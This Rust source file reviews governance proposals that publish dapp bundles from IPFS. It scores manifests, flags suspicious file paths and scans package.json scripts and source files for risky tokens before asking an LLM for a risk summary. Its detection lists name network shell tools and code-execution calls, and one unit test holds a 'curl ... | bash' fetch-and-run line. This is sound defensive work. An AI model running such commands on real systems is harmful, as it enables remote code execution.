use std::collections::BTreeSet;

use anyhow::Result;
use chrono::Utc;
use serde_json::Value;

use crate::{
    config::ReviewConfig,
    ipfs::{BundleFetcher, Manifest},
    llm::{CompositeLlm, LlmContext, redact_secrets},
    types::{DecodedAction, Finding, LlmAudit, Proposal, ReviewResult, Severity},
};

const MAX_TEXT_FETCH_BYTES: usize = 24 * 1024;
const MAX_SOURCE_FILES_FOR_SCAN: usize = 6;

pub async fn review_proposal(
    proposal: &Proposal,
    config: &ReviewConfig,
    bundle_fetcher: &BundleFetcher,
    llm: &CompositeLlm,
    prompt_override: Option<&str>,
) -> Result<ReviewResult> {
    let root_cid = extract_root_cid(&proposal.action);
    let mut findings = Vec::<Finding>::new();
    let mut llm_context = Vec::<String>::new();
    let mut score = match &proposal.action {
        DecodedAction::Unsupported { reason } => {
            findings.push(Finding {
                severity: Severity::Warning,
                message: format!("unsupported action: {reason}"),
            });
            0.25
        }
        _ => 0.7,
    };

    let manifest = if let Some(cid) = &root_cid {
        match bundle_fetcher.fetch_manifest(cid).await {
            Ok(manifest) => {
                score += 0.1;
                Some(manifest)
            }
            Err(err) => {
                findings.push(Finding {
                    severity: Severity::Critical,
                    message: format!("failed to fetch manifest from IPFS: {err}"),
                });
                score -= 0.35;
                None
            }
        }
    } else {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "proposal has no decoded root CID".to_string(),
        });
        score -= 0.2;
        None
    };

    if let Some(m) = manifest.as_ref() {
        evaluate_manifest(m, config, &mut findings, &mut score, &mut llm_context);

        if let Some(cid) = &root_cid {
            analyze_bundle_lightweight(
                bundle_fetcher,
                cid,
                m,
                &mut findings,
                &mut score,
                &mut llm_context,
            )
            .await;
        }
    }

    let llm_output = build_llm_summary(
        proposal,
        manifest.as_ref(),
        llm,
        prompt_override,
        &llm_context,
    )
    .await;
    if llm_output.is_some() {
        score += 0.05;
    }

    score = score.clamp(0.0, 1.0);

    let (llm_summary, llm_audit) = match llm_output {
        Some((summary, audit)) => (Some(summary), Some(audit)),
        None => (None, None),
    };

    Ok(ReviewResult {
        proposal_id: proposal.proposal_id,
        root_cid,
        findings,
        llm_summary,
        llm_audit,
        score,
        reviewed_at: Utc::now(),
    })
}

fn evaluate_manifest(
    manifest: &Manifest,
    config: &ReviewConfig,
    findings: &mut Vec<Finding>,
    score: &mut f32,
    llm_context: &mut Vec<String>,
) {
    let files = manifest.files.clone().unwrap_or_default();

    if files.is_empty() {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "manifest has no files list".to_string(),
        });
        *score -= 0.1;
        return;
    }

    let total_bytes = files.iter().map(|f| f.bytes).sum::<u64>();
    if total_bytes > config.max_bundle_bytes {
        findings.push(Finding {
            severity: Severity::Critical,
            message: format!(
                "bundle exceeds size limit: {} > {} bytes",
                total_bytes, config.max_bundle_bytes
            ),
        });
        *score -= 0.35;
    }

    if files.len() > 500 {
        findings.push(Finding {
            severity: Severity::Warning,
            message: format!(
                "manifest contains unusually high file count: {}",
                files.len()
            ),
        });
        *score -= 0.05;
    }

    let suspicious_paths = [".exe", ".dll", ".so", ".dylib", "../"];
    for file in &files {
        if suspicious_paths
            .iter()
            .any(|needle| file.path.contains(needle))
        {
            findings.push(Finding {
                severity: Severity::Critical,
                message: format!("manifest contains suspicious path: {}", file.path),
            });
            *score -= 0.25;
        }
    }

    llm_context.push(format!(
        "Manifest stats: files={}, total_bytes={}, entry={:?}",
        files.len(),
        total_bytes,
        manifest.entry
    ));
}

async fn analyze_bundle_lightweight(
    bundle_fetcher: &BundleFetcher,
    root_cid: &str,
    manifest: &Manifest,
    findings: &mut Vec<Finding>,
    score: &mut f32,
    llm_context: &mut Vec<String>,
) {
    let files = manifest.files.clone().unwrap_or_default();

    let has_package = files.iter().any(|f| f.path == "package.json");
    let has_vibefi = files.iter().any(|f| f.path == "vibefi.json");

    if !has_package {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "bundle is missing package.json".to_string(),
        });
        *score -= 0.05;
    }
    if !has_vibefi {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "bundle is missing vibefi.json".to_string(),
        });
        *score -= 0.05;
    }

    if has_package
        && let Ok(Some(package_text)) = bundle_fetcher
            .fetch_text_file(root_cid, "package.json", MAX_TEXT_FETCH_BYTES)
            .await
    {
        analyze_package_json(&package_text, findings, score, llm_context);
    }

    let source_candidates = files
        .iter()
        .filter(|f| is_source_path(&f.path) && f.bytes as usize <= MAX_TEXT_FETCH_BYTES)
        .take(MAX_SOURCE_FILES_FOR_SCAN)
        .map(|f| f.path.clone())
        .collect::<Vec<_>>();

    let mut aggregated_hits = BTreeSet::new();
    for path in source_candidates {
        if let Ok(Some(text)) = bundle_fetcher
            .fetch_text_file(root_cid, &path, MAX_TEXT_FETCH_BYTES)
            .await
        {
            let hits = detect_suspicious_tokens(&text);
            if !hits.is_empty() {
                for hit in hits {
                    aggregated_hits.insert(hit.to_string());
                }
                llm_context.push(format!("Suspicious token hits in {}", path));
            }
        }
    }

    if !aggregated_hits.is_empty() {
        findings.push(Finding {
            severity: Severity::Warning,
            message: format!(
                "source scan found potentially risky tokens: {}",
                aggregated_hits.into_iter().collect::<Vec<_>>().join(", ")
            ),
        });
        *score -= 0.1;
    }
}

fn analyze_package_json(
    package_text: &str,
    findings: &mut Vec<Finding>,
    score: &mut f32,
    llm_context: &mut Vec<String>,
) {
    let parsed = serde_json::from_str::<Value>(package_text);
    let Ok(value) = parsed else {
        findings.push(Finding {
            severity: Severity::Warning,
            message: "failed to parse package.json".to_string(),
        });
        *score -= 0.05;
        return;
    };

    if let Some(scripts) = value.get("scripts").and_then(|v| v.as_object()) {
        let mut suspicious = Vec::<String>::new();
        for (name, cmd) in scripts {
            if let Some(cmd_text) = cmd.as_str()
                && contains_suspicious_script_cmd(cmd_text)
            {
                suspicious.push(format!("{}={}", name, cmd_text));
            }
        }

        if !suspicious.is_empty() {
            findings.push(Finding {
                severity: Severity::Warning,
                message: "package.json scripts contain potentially risky commands".to_string(),
            });
            llm_context.push(format!(
                "Suspicious package scripts: {}",
                suspicious.join(" || ")
            ));
            *score -= 0.1;
        }
    }
}

async fn build_llm_summary(
    proposal: &Proposal,
    manifest: Option<&Manifest>,
    llm: &CompositeLlm,
    prompt_override: Option<&str>,
    llm_context: &[String],
) -> Option<(String, LlmAudit)> {
    let prompt = match prompt_override {
        Some(custom) => format!(
            "{custom}\n\n{}",
            review_prompt(proposal, manifest, llm_context)
        ),
        None => review_prompt(proposal, manifest, llm_context),
    };

    llm.analyze_best_effort(&LlmContext {
        prompt: prompt.clone(),
    })
    .await
    .map(|resp| {
        let summary = format!("[{}:{}] {}", resp.provider, resp.model, resp.text);
        let audit = LlmAudit {
            provider: resp.provider,
            model: resp.model,
            prompt_redacted: redact_secrets(&prompt),
            response_redacted: redact_secrets(&resp.text),
        };
        (summary, audit)
    })
}

fn review_prompt(
    proposal: &Proposal,
    manifest: Option<&Manifest>,
    llm_context: &[String],
) -> String {
    let manifest_snippet = if let Some(m) = manifest {
        let files = m.files.as_ref().map(|x| x.len()).unwrap_or_default();
        format!(
            "Manifest: name={:?}, version={:?}, files={}.",
            m.name, m.version, files
        )
    } else {
        "Manifest unavailable.".to_string()
    };

    let context = if llm_context.is_empty() {
        "No extra static-analysis context collected.".to_string()
    } else {
        llm_context.join("\n")
    };

    format!(
        "Review this governance proposal and provide risk summary. Proposal id: {}. Description: {}. Action: {:?}. {}\n\nStatic analysis context:\n{}",
        proposal.proposal_id, proposal.description, proposal.action, manifest_snippet, context
    )
}

fn extract_root_cid(action: &DecodedAction) -> Option<String> {
    match action {
        DecodedAction::PublishDapp { root_cid, .. } => Some(root_cid.clone()),
        DecodedAction::UpgradeDapp { root_cid, .. } => Some(root_cid.clone()),
        DecodedAction::Unsupported { .. } => None,
    }
}

fn is_source_path(path: &str) -> bool {
    [".js", ".jsx", ".ts", ".tsx", ".sol"]
        .iter()
        .any(|ext| path.ends_with(ext))
}

fn contains_suspicious_script_cmd(cmd: &str) -> bool {
    [
        "curl ",
        "wget ",
        "nc ",
        "netcat ",
        "bash -c",
        "powershell",
        "chmod +x",
    ]
    .iter()
    .any(|needle| cmd.contains(needle))
}

fn detect_suspicious_tokens(source: &str) -> Vec<&'static str> {
    [
        "child_process",
        "require('child_process')",
        "require(\"child_process\")",
        "eval(",
        "new Function(",
        "XMLHttpRequest",
        "WebSocket(",
        "http://",
    ]
    .iter()
    .filter(|needle| source.contains(**needle))
    .copied()
    .collect()
}

#[cfg(test)]
mod tests {
    use super::{contains_suspicious_script_cmd, detect_suspicious_tokens};

    #[test]
    fn script_detection_flags_network_shell_commands() {
        assert!(contains_suspicious_script_cmd(
            "curl https://example.com | bash"
        ));
        assert!(!contains_suspicious_script_cmd("bun run test"));
    }

    #[test]
    fn source_detection_finds_risky_tokens() {
        let src = "const { exec } = require('child_process'); eval('x');";
        let hits = detect_suspicious_tokens(src);
        assert!(hits.contains(&"child_process"));
        assert!(hits.contains(&"eval("));
    }
}
